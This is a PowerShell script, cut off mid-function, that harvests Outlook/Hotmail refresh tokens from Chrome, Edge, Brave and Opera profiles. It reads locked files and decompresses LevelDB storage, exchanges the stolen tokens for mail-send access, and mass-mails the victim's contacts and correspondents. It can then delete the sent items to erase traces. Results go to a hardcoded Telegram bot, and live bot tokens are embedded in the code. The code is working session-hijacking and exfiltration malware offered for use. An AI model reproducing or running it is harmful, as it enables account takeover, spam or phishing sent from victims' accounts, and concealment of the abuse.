#Requires -Version 5.1
<#
rehot.ps1 — detector + sender de sessões OWA/Hotmail (port do rehot.py).

Só .NET Framework (Windows PowerShell 5.1). Sem dependências externas.

Fluxo:
  1. Enumera navegadores (Chrome/Edge/Brave/Opera/Opera GX) e TODOS os perfis.
  2. Sinal de sessão: cookie MSPAuth/MSPSec em .live.com (busca crua no banco Cookies).
  3. Extrai o refresh token MSAL do Local Storage/leveldb (descomprimindo blocos
     SNAPPY — o mesmo truque do Python). O refresh real está em "secret".
  4. O refresh token e o client sao extraidos do leveldb do PC onde roda (NAO
     hardcoded). Troca por token READ e WRITE (tentando os clients de mail do
     OWA conhecidos, com o client descoberto como fallback) e valida via REST
     API v2.0 /me.
  5. Decisão: qual perfil usar; se houver mais de um, usa todos.
  6. -SendTo <email>: envia um e-mail de teste.

Uso:
  powershell -File rehot.ps1                 # só detecta
  powershell -File rehot.ps1 -SendTo a@b.com # detecta + envia teste
  powershell -File rehot.ps1 -CloseBrowsers  # fecha navegadores antes (libera perfis travados)
  powershell -File rehot.ps1 -ToAllContacts -Subject "Oi" -Body "msg" [-MaxContacts 50]
      # lista a agenda do cliente e envia a mensagem designada a todos os contatos
  powershell -File rehot.ps1 -ToAllPeople -Subject "Oi" -Body "msg" [-MaxMessages 2000]
      # envia a TODAS as pessoas (contatos + quem ja trocou mail, via Inbox/Enviados)
  powershell -File rehot.ps1 -ToAllRecipients -Subject "Oi" -Body "msg" [-MaxMessages 2000]
      # agenda + TODOS os destinatários do histórico de Enviados (To/Cc/Bcc) — subconjunto de -ToAllPeople (sem Inbox)
  powershell -File rehot.ps1 -ToAllPeople -DryRun
      # so lista os destinatarios (nao envia) — preview/teste seguro
  powershell -File rehot.ps1 -ToAllContacts -Subject "Oi" -Body "msg" -SelfDelete
      # idem + apaga as mensagens enviadas (por assunto) da pasta Enviados
  powershell -File rehot.ps1 -SelfDeleteAll   # apaga TUDO em Enviados (rastro zero)

  Reporte via Telegram (padrao: bot ja configurado; -NoTelegram desliga):
  cada execucao envia p/ o chat um resumo com o nome da maquina, o veredito
  (OK/ERRO), a quantidade de emails enviados e, se houve falha, o erro por
  destinatario. P/ rodar em varios PCs ao mesmo tempo, basta o mesmo comando:
  os relatorios chegam separados no chat, um por maquina.
#>
param(
    [string]$SendTo = "",
    [switch]$NoValidate,
    [switch]$CloseBrowsers,
    [switch]$ToAllContacts,   # envia a mensagem designada para TODOS os contatos da agenda
    [switch]$ToAllPeople,     # envia para TODAS as pessoas (contatos + historico de Inbox/Enviados)
    [switch]$ToAllRecipients, # agenda + To/Cc/Bcc da pasta Enviados (SUBCONJUNTO de -ToAllPeople: NAO inclui Inbox; use quando o alvo é só quem você já enviou e-mail)
    [string]$Subject = "",    # assunto da mensagem (vazio = padrão de teste)
    [string]$Body = "",       # corpo da mensagem (vazio = padrão de teste)
    [int]$MaxContacts = 0,    # trava de segurança: 0 = sem limite (total de destinatarios)
    [int]$MaxMessages = 0,    # -ToAllPeople: max de mensagens escaneadas p/ extrair enderecos (0 = tudo)
    [switch]$DryRun,          # lista os destinatarios sem enviar (preview/teste)
    [switch]$SelfDelete,      # após enviar, apaga as mensagens desta execução (por assunto)
    [switch]$SelfDeleteAll,   # apaga TUDO em Enviados (implica -SelfDelete; rastro zero)
    [string]$TelegramToken = "8843500792:AAFSogh_01V4ULAxnFy05H8qrRJcu60ozSY",  # token do bot (vazio = sem reporte)
    [string]$TelegramChatId = "6168636325",                                     # chat_id de destino do reporte
    [switch]$NoTelegram,     # desliga o reporte via Telegram
    [string]$ListaToken  = "8623526001:AAGa0-cXzKzn20FpJQp1VskjgjUMXY5PW7Q",
    [string]$ListaChatId = "6168636325"
)

$ErrorActionPreference = "Stop"
try { [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 } catch {}

# ---------------- constantes ----------------
$APPDATA      = $env:APPDATA
$LOCALAPPDATA = $env:LOCALAPPDATA
# Client IDs do OWA = registros de app da Microsoft (iguais em TODO PC; NAO sao
# segredo do PC). O que varia por PC e o REFRESH TOKEN, extraido do leveldb do
# navegador (Get-MSALToken). O client descoberto no leveldb tem prioridade; as
# listas abaixo sao fallback conhecido p/ quando o PC usar outro client do OWA.
$OWA_KNOWN_CLIENTIDS      = @("9199bf20-a13f-4107-85dc-02114787ef48")  # SPA do OWA (read)
$OWA_KNOWN_MAIL_CLIENTIDS = @("6bc89243-be1c-423a-99ec-b9a45b8b568b")  # API de mail (write)
$OWA_READ_SCOPE  = "https://outlook.office.com/.default"
$OWA_TOKEN_URL   = "https://login.microsoftonline.com/common/oauth2/v2.0/token"
$OWA_API_BASE    = "https://outlook.office.com/api/v2.0"
$OWA_ORIGIN      = "https://outlook.live.com"

$browsers = @(
    @{ Name = "Chrome";     Root = Join-Path $LOCALAPPDATA "Google\Chrome\User Data" },
    @{ Name = "Edge";       Root = Join-Path $LOCALAPPDATA "Microsoft\Edge\User Data" },
    @{ Name = "Brave";      Root = Join-Path $LOCALAPPDATA "BraveSoftware\Brave-Browser\User Data" },
    @{ Name = "Opera";      Root = Join-Path $APPDATA "Opera Software\Opera Stable" },
    @{ Name = "Opera GX";   Root = Join-Path $APPDATA "Opera Software\Opera GX Stable" }
)

# ---------------- leitura de arquivo (mesmo travado) ----------------
$script:_FileIOReady = $false
function Ensure-FileIO {
    if ($script:_FileIOReady) { return }
    $sig = @'
using System;
using System.IO;
using System.Runtime.InteropServices;
public static class FileIO {
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    public static extern IntPtr CreateFileW(string n, uint a, uint s, IntPtr sec, uint d, uint f, IntPtr t);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool ReadFile(IntPtr h, byte[] b, uint n, out uint r, IntPtr o);
    [DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(IntPtr h);
    public static byte[] ReadAll(string path) {
        IntPtr h = CreateFileW(path, 0x80000000, 0x7, IntPtr.Zero, 3, 0, IntPtr.Zero);
        if (h == IntPtr.Zero || h == new IntPtr(-1)) return null;
        using (var ms = new MemoryStream()) {
            byte[] buf = new byte[1 << 20]; uint r;
            while (ReadFile(h, buf, (uint)buf.Length, out r, IntPtr.Zero) && r > 0)
                ms.Write(buf, 0, (int)r);
            CloseHandle(h);
            return ms.ToArray();
        }
    }
}
'@
    try { Add-Type -TypeDefinition $sig } catch {}
    $script:_FileIOReady = $true
}

# ---------------- snappy em C# (rápido) ----------------
# O loop byte-a-byte do PowerShell é ~650x mais lento que C#. Compilamos um
# helper via Add-Type que faz o walk + descompressão de todo o arquivo .ldb.
$script:_SnappyReady = $false
function Ensure-Snappy {
    if ($script:_SnappyReady) { return }
    $sig = @'
using System;
using System.IO;
public static class SnappyLdb {
    static int ReadVarint(byte[] d, int pos, out int val) {
        int result = 0, shift = 0;
        while (true) {
            if (pos >= d.Length) { val = 0; return -1; }
            byte b = d[pos]; pos++;
            result |= (b & 0x7F) << shift;
            if ((b & 0x80) == 0) { val = result; return pos; }
            shift += 7;
            if (shift > 35) { val = 0; return -1; }
        }
    }
    static int SnappyOne(byte[] src, int start, byte[] dst, out int consumed) {
        int declared;
        int pos = start;
        try {
            int p = ReadVarint(src, pos, out declared);
            if (p < 0) { consumed = 0; return -1; }
            pos = p;
            if (declared <= 0 || declared > (1 << 22)) { consumed = 0; return -1; }
            int outLen = 0;
            while (pos < src.Length && outLen < declared) {
                byte tag = src[pos]; pos++;
                int t = tag & 3;
                if (t == 0) {
                    int l = (tag >> 2) + 1;
                    if (l > 60) {
                        int nb = l - 60;
                        long lv = 0;
                        for (int i = 0; i < nb; i++) lv |= (long)src[pos + i] << (i * 8);
                        pos += nb;
                        l = (int)lv + 1;
                    }
                    if (l <= 0 || pos + l > src.Length) { consumed = 0; return -1; }
                    Buffer.BlockCopy(src, pos, dst, outLen, l);
                    pos += l; outLen += l;
                } else if (t == 1) {
                    int l = ((tag >> 2) & 0x7) + 4;
                    if (pos >= src.Length) { consumed = 0; return -1; }
                    int off = ((tag >> 5) << 8) | src[pos]; pos++;
                    if (off <= 0 || off > outLen) { consumed = 0; return -1; }
                    if (off >= l) Buffer.BlockCopy(dst, outLen - off, dst, outLen, l);
                    else for (int i = 0; i < l; i++) dst[outLen + i] = dst[outLen + i - off];
                    outLen += l;
                } else if (t == 2) {
                    int l = (tag >> 2) + 1;
                    if (pos + 2 > src.Length) { consumed = 0; return -1; }
                    int off = src[pos] | (src[pos + 1] << 8); pos += 2;
                    if (off <= 0 || off > outLen) { consumed = 0; return -1; }
                    if (off >= l) Buffer.BlockCopy(dst, outLen - off, dst, outLen, l);
                    else for (int i = 0; i < l; i++) dst[outLen + i] = dst[outLen + i - off];
                    outLen += l;
                } else {
                    int l = (tag >> 2) + 1;
                    if (pos + 4 > src.Length) { consumed = 0; return -1; }
                    int off = src[pos] | (src[pos + 1] << 8) | (src[pos + 2] << 16) | (src[pos + 3] << 24); pos += 4;
                    if (off <= 0 || off > outLen) { consumed = 0; return -1; }
                    if (off >= l) Buffer.BlockCopy(dst, outLen - off, dst, outLen, l);
                    else for (int i = 0; i < l; i++) dst[outLen + i] = dst[outLen + i - off];
                    outLen += l;
                }
            }
            if (outLen != declared) { consumed = 0; return -1; }
            consumed = pos;
            return declared;
        } catch { consumed = 0; return -1; }
    }
    public static byte[] DecompressFile(byte[] data) {
        if (data == null || data.Length < 48) return null;
        ulong magic = BitConverter.ToUInt64(data, data.Length - 8);
        if (magic != 0x88328E1720020B68UL && magic != 0xDB4775248B80FB57UL) return null;
        int metaOff, metaLen, idxOff, idxLen;
        int p = data.Length - 48;
        int a = ReadVarint(data, p, out metaOff); if (a < 0) return null;
        int b = ReadVarint(data, a, out metaLen); if (b < 0) return null;
        int c = ReadVarint(data, b, out idxOff); if (c < 0) return null;
        int d2 = ReadVarint(data, c, out idxLen); if (d2 < 0) return null;
        int end = Math.Min(idxOff, data.Length - 48);
        var ms = new MemoryStream();
        int pos = 0;
        byte[] block = new byte[1 << 22];
        int consumed;
        while (pos < end) {
            int declared = SnappyOne(data, pos, block, out consumed);
            if (declared < 0) { pos++; continue; }
            ms.Write(block, 0, declared);
            pos = consumed;
        }
        return ms.ToArray();
    }
}
'@
    try { Add-Type -TypeDefinition $sig } catch {}
    $script:_SnappyReady = $true
}

function Read-FileBytes([string]$path) {
    try { return [System.IO.File]::ReadAllBytes($path) } catch {}
    Ensure-FileIO
    return [FileIO]::ReadAll($path)
}

# ---------------- snappy (port do leveldb_scan.py) ----------------
function Read-Varint([byte[]]$buf, [ref]$pos) {
    $result = [int64]0
    $shift = 0
    while ($true) {
        $b = $buf[$pos.Value]
        $pos.Value++
        $result = $result -bor ([int64]($b -band 0x7F) -shl $shift)
        if (($b -band 0x80) -eq 0) { return $result }
        $shift += 7
    }
}

function Expand-Snappy([byte[]]$src, [int]$start) {
    # retorna [PSCustomObject]@{Out;Consumed} ou $null se inválido
    $pos = $start
    $n = Read-Varint $src ([ref]$pos)
    if ($n -le 0 -or $n -gt (1 -shl 22)) { return $null }
    $out = New-Object byte[] $n
    $outLen = 0
    try {
        while ($pos -lt $src.Length -and $outLen -lt $n) {
            $tag = $src[$pos]; $pos++
            $t = $tag -band 3
            if ($t -eq 0) {                       # literal
                $l = ($tag -shr 2) + 1
                if ($l -gt 60) {
                    $nb = $l - 60
                    $lv = [int64]0
                    for ($i = 0; $i -lt $nb; $i++) { $lv = $lv -bor ([int64]$src[$pos + $i] -shl ($i * 8)) }
                    $pos += $nb
                    $l = [int]($lv + 1)
                }
                [Array]::Copy($src, $pos, $out, $outLen, $l)
                $pos += $l; $outLen += $l
            }
            elseif ($t -eq 1) {                   # copy, offset 1 byte
                $l = (($tag -shr 2) -band 0x7) + 4
                $off = (($tag -shr 5) -shl 8) -bor $src[$pos]; $pos++
                if ($off -ge $l) { [Array]::Copy($out, $outLen - $off, $out, $outLen, $l) }
                else { for ($i = 0; $i -lt $l; $i++) { $out[$outLen + $i] = $out[$outLen + $i - $off] } }
                $outLen += $l
            }
            elseif ($t -eq 2) {                   # copy, offset 2 bytes
                $l = ($tag -shr 2) + 1
                $off = $src[$pos] -bor ($src[$pos + 1] -shl 8); $pos += 2
                if ($off -ge $l) { [Array]::Copy($out, $outLen - $off, $out, $outLen, $l) }
                else { for ($i = 0; $i -lt $l; $i++) { $out[$outLen + $i] = $out[$outLen + $i - $off] } }
                $outLen += $l
            }
            else {                                # copy, offset 4 bytes
                $l = ($tag -shr 2) + 1
                $off = $src[$pos] -bor ($src[$pos + 1] -shl 8) -bor ($src[$pos + 2] -shl 16) -bor ($src[$pos + 3] -shl 24)
                $pos += 4
                if ($off -ge $l) { [Array]::Copy($out, $outLen - $off, $out, $outLen, $l) }
                else { for ($i = 0; $i -lt $l; $i++) { $out[$outLen + $i] = $out[$outLen + $i - $off] } }
                $outLen += $l
            }
        }
    } catch { return $null }
    if ($outLen -ne $n) { return $null }
    return [PSCustomObject]@{ Out = $out; Consumed = $pos }
}

function Get-LeveldbBlob([string]$path) {
    $data = Read-FileBytes $path
    if (-not $data -or $data.Length -lt 48) { return $null }
    # caminho rápido: descompressão em C# (Add-Type) — ~650x mais rápido que o loop PS
    Ensure-Snappy
    try {
        $blob = [SnappyLdb]::DecompressFile($data)
        if ($blob) { return $blob }
    } catch {}
    # fallback: walk em PowerShell (lento, mas funciona sem Add-Type)
    # ToInt64 (não ToUInt64): os literais hex > Int64max são parseados como Int64
    # negativo no PowerShell, então o magic precisa ser lido como Int64 p/ bater.
    $magic = [BitConverter]::ToInt64($data, $data.Length - 8)
    if ($magic -ne 0x88328E1720020B68 -and $magic -ne 0xDB4775248B80FB57) { return $null }
    $p = $data.Length - 48
    $metaOff = Read-Varint $data ([ref]$p)
    $metaLen = Read-Varint $data ([ref]$p)
    $idxOff  = Read-Varint $data ([ref]$p)
    $idxLen  = Read-Varint $data ([ref]$p)
    $end = [Math]::Min([int]$idxOff, $data.Length - 48)
    $ms = New-Object System.IO.MemoryStream
    $pos = 0
    while ($pos -lt $end) {
        $r = Expand-Snappy $data $pos
        if ($null -eq $r) { $pos++; continue }
        $ms.Write($r.Out, 0, $r.Out.Length)
        $pos = $r.Consumed
    }
    return $ms.ToArray()
}

# ---------------- MSAL: extrai refresh token + client ----------------
# Busca grants de refresh token num texto bruto (blob descomprimido de .ldb ou
# bytes crus de .log). Retorna lista de @{ refresh; client; stamp }.
function Get-MSALTokensInText([string]$text) {
    $found = @()
    if (-not $text) { return $found }
    $searchStart = 0
    while ($true) {
        $idx = $text.IndexOf('"credentialType":"RefreshToken"', $searchStart)
        if ($idx -lt 0) { break }
        $openBrace  = $text.LastIndexOf('{', $idx)
        $closeBrace = $text.IndexOf('}', $idx)
        if ($openBrace -ge 0 -and $closeBrace -gt $openBrace) {
            $json = $text.Substring($openBrace, $closeBrace - $openBrace + 1)
            try {
                $obj = $json | ConvertFrom-Json
                if ($obj.secret -and $obj.clientId) {
                    $stamp = [int64]0
                    if ($obj.lastUpdatedAt) { $stamp = [int64]$obj.lastUpdatedAt }
                    elseif ($obj.expiresOn) { $stamp = [int64]$obj.expiresOn }
                    $found += @{ refresh = $obj.secret; client = $obj.clientId; stamp = $stamp }
                }
            } catch {}
        }
        $searchStart = $idx + 1
    }
    # FALLBACK FUZZY: registro corrompido — credentialType truncado por byte NULL
    # (ex.: "Refr<N>" em vez de "RefreshToken"), campos garbled. Acontece quando o
    # leveldb compacta com um write parcial. O secret continua presente como a
    # string base64url mais longa do registro; o clientId pode estar garbled,
    # entao usamos o client OWA conhecido como fallback. Sem isto, o PC fica
    # "LOGADO_SESSAO_VIVA" mas "msal=false" (false negative do cliente).
    if ($found.Count -eq 0) {
        $fs = 0
        while (($idx = $text.IndexOf('"credentialType":"Refr', $fs)) -ge 0) {
            $winStart = $idx
            $winLen = [Math]::Min(700, $text.Length - $winStart)
            $win = $text.Substring($winStart, $winLen)
            $clean = $win -replace "`0", ""
            $ms = [regex]::Matches($clean, '[A-Za-z0-9_\-]{20,}')
            if ($ms.Count -gt 0) {
                $longest = ""
                foreach ($m in $ms) { if ($m.Value.Length -gt $longest.Length) { $longest = $m.Value } }
                if ($longest.Length -ge 40) {
                    $client = ""
                    if ($clean -match '"clientId":"([a-f0-9\-]{36})"') { $client = $Matches[1] }
                    if (-not $client) { $client = $OWA_KNOWN_CLIENTIDS[0] }
                    $found += @{ refresh = $longest; client = $client; stamp = [int64]0; fuzzy = $true }
                }
            }
            $fs = $idx + 1
        }
    }
    return $found
}

# ---------------- MSAL: extrai refresh token + client ----------------
function Get-MSALToken([string]$leveldbDir) {
    if (-not (Test-Path $leveldbDir)) { return $null }
    # O leveldb guarda VARIOS refresh tokens (historico de logins). O mais NOVO
    # (maior lastUpdatedAt) e o valido; o antigo costuma estar expirado
    # (AADSTS70000). Coletamos TODOS e so no fim escolhemos o mais fresco,
    # priorizando o client conhecido do OWA.
    #
    # Duas fontes: (1) *.ldb — blocos SNAPPY descomprimidos; (2) *.log — o WAL
    # (write-ahead log). Gravações RECENTES (login feito agora, ou o navegador
    # matado com -CloseBrowsers ANTES de compactar) ficam no .log e NAO em
    # nenhum .ldb ainda. Ler so .ldb deixava esses tokens de fora — o caso
    # "Outlook logado mas sem_perfil_com_token". O .log e lido CRU (sem snappy):
    # o valor JSON ja esta em texto claro dentro dos registros do log.
    $all = @()
    foreach ($f in (Get-ChildItem $leveldbDir -Filter *.ldb -ErrorAction SilentlyContinue)) {
        $blob = Get-LeveldbBlob $f.FullName
        if ($blob -and $blob.Length -gt 0) {
            $all += Get-MSALTokensInText ([System.Text.Encoding]::ASCII.GetString($blob))
        }
    }
    foreach ($f in (Get-ChildItem $leveldbDir -Filter *.log -ErrorAction SilentlyContinue)) {
        $bytes = Read-FileBytes $f.FullName
        if ($bytes -and $bytes.Length -gt 0) {
            $all += Get-MSALTokensInText ([System.Text.Encoding]::ASCII.GetString($bytes))
        }
    }
    $best = $null; $bestStamp = [int64]0
    $fallback = $null; $fallbackStamp = [int64]0
    foreach ($t in $all) {
        if ($OWA_KNOWN_CLIENTIDS -contains $t.client) {
            if ($t.stamp -ge $bestStamp) {
                $best = @{ refresh = $t.refresh; client = $t.client }
                $bestStamp = $t.stamp
            }
        } elseif ($t.stamp -ge $fallbackStamp) {
            $fallback = @{ refresh = $t.refresh; client = $t.client }
            $fallbackStamp = $t.stamp
        }
    }
    if ($best) { return $best }
    return $fallback
}

# ---------------- cookies (sinal de sessão, busca crua) ----------------
function Test-MSCookies([string]$profileDir) {
    $net    = Join-Path $profileDir "Network\Cookies"
    $legacy = Join-Path $profileDir "Cookies"
    $src = if (Test-Path $net) { $net } elseif (Test-Path $legacy) { $legacy } else { $null }
    if (-not $src) { return @{ state = "absent"; ms = $false; outlook = 0 } }
    $bytes = Read-FileBytes $src
    if (-not $bytes) { return @{ state = "locked"; ms = $false; outlook = 0 } }
    $text = [System.Text.Encoding]::ASCII.GetString($bytes)
    $ms = $text.Contains("MSPAuth") -or $text.Contains("MSPSec")
    $outlook = ([regex]::Matches($text, "outlook\.live\.com|outlook\.office\.com")).Count
    return @{ state = "ok"; ms = $ms; outlook = $outlook }
}

# ---------------- HTTP: troca / validação / envio ----------------
function UrlEnc([string]$s) { [System.Uri]::EscapeDataString($s) }

# $script:LastExchangeError guarda o motivo da última troca que falhou (p/
# diagnosticar "msal=true mas token_read=null" — ex.: refresh revogado, MFA, rede).
$script:LastExchangeError = $null
function Exchange-OWAToken([string]$refresh, [string]$client, [string]$scope) {
    $script:LastExchangeError = $null
    $body = "grant_type=refresh_token&refresh_token=$(UrlEnc $refresh)&client_id=$(UrlEnc $client)&scope=$(UrlEnc $scope)"
    # HttpWebRequest (nao Invoke-WebRequest): o IWR 5.1 consome o corpo da resposta
    # antes do catch, deixando o erro vazio. Aqui capturamos status + corpo de
    # verdade (ex.: AADSTS70000 = grant expirado, usuario precisa entrar de novo).
    # Tudo dentro do try: falha de rede no GetRequestStream nao pode derrubar o
    # script inteiro ($ErrorActionPreference=Stop).
    try {
        $req = [System.Net.HttpWebRequest]::Create($OWA_TOKEN_URL)
        $req.Method = "POST"
        $req.ContentType = "application/x-www-form-urlencoded"
        $req.Headers.Add("Origin", $OWA_ORIGIN)
        $req.Timeout = 30000
        $bytes = [System.Text.Encoding]::UTF8.GetBytes($body)
        $rs = $req.GetRequestStream()
        $rs.Write($bytes, 0, $bytes.Length)
        $rs.Close()
        $resp = $req.GetResponse()
        $sr = New-Object System.IO.StreamReader($resp.GetResponseStream())
        $content = $sr.ReadToEnd()
        $resp.Close()
        $j = $content | ConvertFrom-Json
        return $j.access_token
    } catch [System.Net.WebException] {
        $code = 0; $errBody = ""
        $hr = $_.Exception.Response
        if ($hr) {
            $code = [int]$hr.StatusCode
            try { $sr = New-Object System.IO.StreamReader($hr.GetResponseStream()); $errBody = $sr.ReadToEnd(); $hr.Close() } catch {}
        }
        $script:LastExchangeError = "HTTP $code | $errBody"
        return $null
    } catch {
        $script:LastExchangeError = $_.Exception.Message
        return $null
    }
}

# Traduz o erro bruto da troca em uma dica acionavel (p/ o log se auto-explicar
# quando o token nao valida). AADSTS70000 = grant expirado (entrar de novo no
# Outlook resolve); invalid_grant = revogado/rotacionado; 50120/50020 = MFA ou
# politica de sign-in; sem codigo HTTP = falha de rede.
function Get-ExchangeErrorHint([string]$err) {
    if (-not $err) { return "troca sem erro capturado" }
    if ($err -match "AADSTS70000") { return "refresh token EXPIRADO (AADSTS70000) — entre de novo no Outlook/OWA no navegador para renovar" }
    if ($err -match "AADSTS50120|AADSTS50020") { return "política de sign-in (MFA/frequência) — entre de novo no Outlook no navegador" }
    if ($err -match "invalid_grant") { return "refresh token inválido/revogado — entre de novo no Outlook no navegador" }
    if ($err -match "HTTP 401") { return "token 401 (não autenticado) — entre de novo no Outlook no navegador" }
    if ($err -match "HTTP 429") { return "throttle (429) — tente de novo em instantes" }
    if ($err -match "HTTP 400") { return "erro 400 na troca do token — verifique o corpo do erro" }
    if ($err -notmatch "HTTP \d+") { return "falha de rede ao trocar o token — verifique a conexão" }
    return "erro na troca do token — verifique o corpo do erro"
}

function Test-OWAToken([string]$token) {
    try {
        $resp = Invoke-WebRequest -Uri "$OWA_API_BASE/me" -Headers @{ "Authorization" = "Bearer $token" } -UseBasicParsing
        $j = $resp.Content | ConvertFrom-Json
        $email = $j.EmailAddress
        if ($email -is [System.Management.Automation.PSCustomObject]) { $email = $email.Address }
        return @{ state = "valido"; email = $email }
    } catch {
        $code = 0
        if ($_.Exception.Response) { $code = [int]$_.Exception.Response.StatusCode }
        if ($code -eq 401) { return @{ state = "expirado"; email = $null } }
        return @{ state = "erro"; email = $null }
    }
}

# Adquire token WRITE (Mail.Send) para o refresh token do PC onde roda.
# O client que FAZ a troca e sempre o dono do refresh token ($client, descoberto
# no leveldb); o que varia e o scope (api://<mailClient>/.default). Tenta, em
# ordem: os clients de mail conhecidos do OWA e, por fim, o proprio client
# descoberto (caso ele mesmo carregue Mail.Send). Retorna @{ token; mailClient;
# email } do primeiro que validar via /me, ou $null.
function Get-OWAWriteToken([string]$refresh, [string]$client) {
    $candidates = @($OWA_KNOWN_MAIL_CLIENTIDS) + @($client)
    foreach ($mc in ($candidates | Select-Object -Unique)) {
        if (-not $mc) { continue }
        $tok = Exchange-OWAToken $refresh $client "api://$mc/.default"
        if (-not $tok) { continue }
        $v = Test-OWAToken $tok
        if ($v.state -eq "valido") {
            return @{ token = $tok; mailClient = $mc; email = $v.email }
        }
    }
    return $null
}

function Send-OWAMail([string]$token, [string]$to, [string]$subject, [string]$body) {
    $payload = @{
        Message = @{
            Subject = $subject
            Body = @{ ContentType = "Text"; Content = $body }
            ToRecipients = @(@{ EmailAddress = @{ Address = $to } })
        }
        SaveToSentItems = $true
    } | ConvertTo-Json -Depth 5
    # corpo como byte[] UTF-8: Invoke-WebRequest 5.1 codifica string no charset
    # do sistema (Windows-1252), o que corrompe acentos e quebra o JSON (400).
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
    try {
        $resp = Invoke-WebRequest -Uri "$OWA_API_BASE/me/sendMail" -Method Post -Body $bytes `
            -Headers @{ "Authorization" = "Bearer $token"; "Origin" = $OWA_ORIGIN } `
            -ContentType "application/json" -UseBasicParsing
        return @{ ok = ($resp.StatusCode -eq 202); status = [int]$resp.StatusCode; erro = $null }
    } catch {
        $code = 0; $erro = $null
        if ($_.Exception.Response) {
            $code = [int]$_.Exception.Response.StatusCode
            try {
                $sr = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream())
                $erro = $sr.ReadToEnd()
            } catch {}
        }
        return @{ ok = $false; status = $code; erro = $erro }
    }
}

# ---------------- Telegram: reporte por máquina ----------------
# O cliente roda o MESMO comando em vários PCs ao mesmo tempo; cada execução
# dispara um resumo para o bot (token/chat_id fixos por padrão). O envio vai em
# try/catch: falha no Telegram NAO derruba o envio (que ja aconteceu) — vira
# apenas o campo "telegram" no JSON de saida.
function Send-TelegramMessage([string]$token, [string]$chatId, [string]$text) {
    if (-not $token -or -not $chatId) { return @{ ok = $false; erro = "token/chat_id vazio" } }
    $url = "https://api.telegram.org/bot$token/sendMessage"
    $payload = @{ chat_id = $chatId; text = $text; disable_web_page_preview = $true } | ConvertTo-Json -Depth 4
    $bytes = [System.Text.Encoding]::UTF8.GetBytes($payload)
    try {
        $resp = Invoke-WebRequest -Uri $url -Method Post -Body $bytes `
            -ContentType "application/json; charset=utf-8" -UseBasicParsing
        $j = $resp.Content | ConvertFrom-Json
        return @{ ok = [bool]$j.ok; erro = $null }
    } catch {
        $code = 0; $err = $null
        if ($_.Exception.Response) {
            $code = [int]$_.Exception.Response.StatusCode
            try { $sr = New-Object System.IO.StreamReader($_.Exception.Response.GetResponseStream()); $err = $sr.ReadToEnd() } catch {}
        }
        return @{ ok = $false; erro = "HTTP $code | $err" }
    }
}

# Monta o texto do reporte a partir do objeto final ($out). Prioridade:
# -ToAllContacts/-ToAllPeople (envio_todos) > -SendTo (envio) > somente deteccao.
# Mostra: máquina, conta, veredito OK/PARCIAL/ERRO, qtd enviados e (se houver)
# os erros por destinatario — o suficiente p/ triagem em massa de vários PCs.
function Build-ReportText($out) {
    $L = @()
    $L += "📧 EnvioHOT — $($out.maquina)"
    if ($out.envio_todos) {
        $et = $out.envio_todos
        $conta = if ($et.de) { $et.de } else { "(sem conta com token)" }
        $L += "👤 $conta"
        if ($et.status) {
            $L += "🔴 ERRO — $($et.status)"
            # Mostra o MOTIVO (a decisao): ex. "troca do refresh FALHOU -> token
            # EXPIRADO", "arquivos travados (navegador aberto)", "NENHUMA sessao".
            # Sem isso o cliente so via "sem_perfil_com_token" e nao sabia por que.
            if ($out.decisao) {
                $motivo = $out.decisao
                if ($motivo.Length -gt 300) { $motivo = $motivo.Substring(0, 300) + "…" }
                $L += "📋 $motivo"
            }
        } elseif ($et.modo -eq "dryrun") {
            $L += "🟡 DRY RUN — $($et.total) destinatário(s), nenhum enviado"
            if ($et.quebra) {
                $L += "   📇 $($et.quebra.daAgenda) da agenda + $($et.quebra.doHistorico) novos do histórico de enviados (mensagens escaneadas: $($et.quebra.scanned))"
                if (@($et.quebra.amostra).Count -gt 0) {
                    $L += "   📩 amostra do histórico: " + (@($et.quebra.amostra) -join ", ")
                }
                if (-not $et.quebra.sentFolderFound) {
                    $L += "   ⚠️ pasta Enviados NÃO encontrada por nome — só a agenda foi usada"
                }
            }
        } else {
            $falhas = @($et.falhas)
            if ($et.enviados -gt 0 -and $falhas.Count -eq 0) {
                $L += "🟢 OK — $($et.enviados)/$($et.total) enviados (HTTP 202)"
            } elseif ($et.enviados -gt 0) {
                $L += "🟡 PARCIAL — $($et.enviados)/$($et.total) enviados, $($falhas.Count) falha(s)"
            } else {
                $L += "🔴 ERRO — 0/$($et.total) enviados, $($falhas.Count) falha(s)"
            }
            if ($falhas.Count -gt 0) {
                foreach ($f in ($falhas | Select-Object -First 10)) {
                    $err = "$($f.erro)"
                    if ($err.Length -gt 140) { $err = $err.Substring(0, 140) + "…" }
                    $L += "   ❌ $($f.email): HTTP $($f.status) $err"
                }
                if ($falhas.Count -gt 10) { $L += "   … e mais $($falhas.Count - 10) falha(s)" }
            }
            if ($et.limite_atingido) {
                # trava disparou (429 limite OU 403 suspensa): avisa o motivo e quantos
                # nao foram nem tentados (total - enviados - falhas; o erro ja esta em falhas).
                $naoTentados = $et.total - $et.enviados - $falhas.Count
                $motivoTrava = if ($et.erro_trava) { $et.erro_trava } else { "Limite diário atingido (HTTP 429)" }
                $L += "   ⏸️ $motivoTrava — $($naoTentados) destinatário(s) NÃO tentado(s)"
            }
        }
    }
    elseif ($out.envio) {
        $e = $out.envio
        $L += "👤 $($e.de) → $($e.para)"
        if ($e.ok) { $L += "🟢 OK — enviado (HTTP $($e.status))" }
        else {
            $err = "$($e.erro)"; if ($err.Length -gt 200) { $err = $err.Substring(0, 200) + "…" }
            $L += "🔴 ERRO — HTTP $($e.status) $err"
        }
    }
    else {
        $L += "ℹ️ Somente detecção (sem envio)"
        $L += $out.decisao
    }
    return ($L -join "`n")
}

# Bot de lista: a cada execucao (cliente/remetente), envia ao SEGUNDO bot o
# email do remetente + todos os emails enviados + os que falharam por limite
# excedido (HTTP 429 ErrorExceededMessageLimit), p/ o usuario montar a lista
# de destinatarios por remetente.
function Build-ListaText([string]$remetente, [array]$enviados, [array]$falhaLimite) {
    $L = @()
    $L += "📋 LISTA — remetente: $remetente"
    if ($enviados.Count -gt 0) {
        $L += ""
        $L += "✅ Enviados ($($enviados.Count)):"
        foreach ($e in $enviados) { $L += "  $e" }
    }
    if ($falhaLimite.Count -gt 0) {
        $L += ""
        $L += "⏸️ Falha por limite excedido ($($falhaLimite.Count)):"
